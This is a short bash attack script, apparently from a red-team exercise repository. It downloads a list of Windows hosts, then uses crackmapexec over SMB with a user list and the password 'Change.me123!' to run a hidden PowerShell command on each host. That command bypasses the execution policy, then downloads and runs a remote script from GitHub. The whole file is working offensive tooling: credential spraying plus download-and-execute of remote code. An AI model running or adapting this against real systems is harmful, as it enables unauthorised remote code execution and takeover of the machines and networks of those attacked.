#!/bin/bash

curl -o windows.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt

crackmapexec smb windows.txt -u users.txt -p 'Change.me123!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/update.ps1')"&
